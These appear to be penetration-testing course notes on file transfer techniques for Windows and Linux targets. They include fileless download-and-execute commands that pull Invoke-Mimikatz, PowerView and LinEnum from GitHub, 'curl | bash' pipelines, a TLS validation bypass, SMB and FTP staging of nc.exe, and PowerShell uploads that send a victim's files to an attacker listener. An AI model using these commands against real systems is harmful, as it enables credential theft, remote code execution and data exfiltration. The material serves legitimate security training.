# Windows File Transfers

## Download Operations

### PowerShell Base64 Encode & Decode

If a file is small in size, we can encode a file to base64 string, copy its content from the terminal and perform the reverse operation decoding the file in the original content

Primary usage: If the file content is very small in size and we have access to the terminal

#### Encode file content to base64

```bash
cat id_rsa |base64 -w 0;echo
```

Copy this to a windows powershell ans use it to decode it

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
```

### PowerShell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

| Method | Description |
| :----- | :---------- |
| OpenRead | Returns the data from a resource as a Stream. |
| OpenReadAsync | Returns the data from a resource without blocking the calling thread. |
| DownloadData | Downloads data from a resource and returns a Byte array. |
| DownloadDataAsync | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile | Downloads data from a resource to a local file. |
| DownloadFileAsync | Downloads data from a resource to a local file without blocking the calling thread. |
| DownloadString | Downloads a String from a resource and returns a String. |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread. |

#### PowerShell DownloadFile Method

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

**Example**

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

#### PowerShell DownloadString - Fileless Method

Fileless method means that we can use a file and executing it without saving the file itself to the disk. We can run it directly in memory using the Invoke-Expression cmdlet ot it's alias IEX

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest

Can be used to download files, we can also use its aliases iwr, curl, wget instead of the Invoke-WebRequest

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`

```
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

#### Create the SMB Server

```bash
impacket-smbserver [shareName] [sharePath]
```

Modern Windows settings prevent SMB v1 connections, but typically that results in a different error. We could try providing the SMB2 arguments

```bash
impacket-smbserver [shareName] -smb2support [sharePath]
```

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:

```
copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```
copy \\192.168.220.133\share\nc.exe
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now we can connect to it using 

```powershell
net use n: \\192.168.220.133\share /user:test test
The command completed successfully.
copy n:\nc.exe
```

### FTP Downloads

We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

#### Installing the FTP Server Python3 Module pyftpdlib

```bash
pip3 install pyftpdlib
```

pyftpdlib uses port 2121 by default. Anonymous authentication is enabled by default if we don't set a user and password.

#### Setting up a Python3 FTP Server

```bash
python3 -m pyftpdlib --port <port number>
```

```bash
sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

#### Transfering Files from an FTP Server Using PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Create a Command File for the FTP Client and Download the Target File

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

File example:

```
open [IP]
USER anonymous
binary
GET [filename]
bye
```

And then execute this file using this command

```bash
ftp -v -n -s:ftpcommand.txt
```

## Uplaod Operations

### PowerShell Base64 Encode & Decode

#### Encode File Using PowerShell

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

#### Decode Base64 String in Linux

```bash
echo [HASH] | base64 -d > hosts
```

### PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. Let's install it and start the webserver.

#### Installing a Configured WebServer with Upload

```bash
pip3 install uploadserver
```

Usage

```bash
python -m uploadserver
```

Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file.

#### PowerShell Script to Upload a File to Python Upload Server

```powershell
IEX(New-Object Net.WebClient).DownloadString('[URL]')
```

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```
echo <base64> | base64 -d -w 0 > hosts
```

```
nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgK
```

# Linux File Transfers

## Fileless Attacks Using Linux

### Fileless Download with cURL

```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Download with wget

```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

### Connect to the Target Webserver

```
exec 3<>/dev/tcp/10.10.10.32/80
```

### HTTP GET Request

```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response

```
cat <&3
```

### Linux - Creating a Web Server with PHP

```
php -S 0.0.0.0:8000
```

### Linux - Creating a Web Server with Ruby

```
ruby -run -ehttpd . -p8000
```

### Linux - Creating a Web Server with Python2.7

```
python2.7 -m SimpleHTTPServer
```

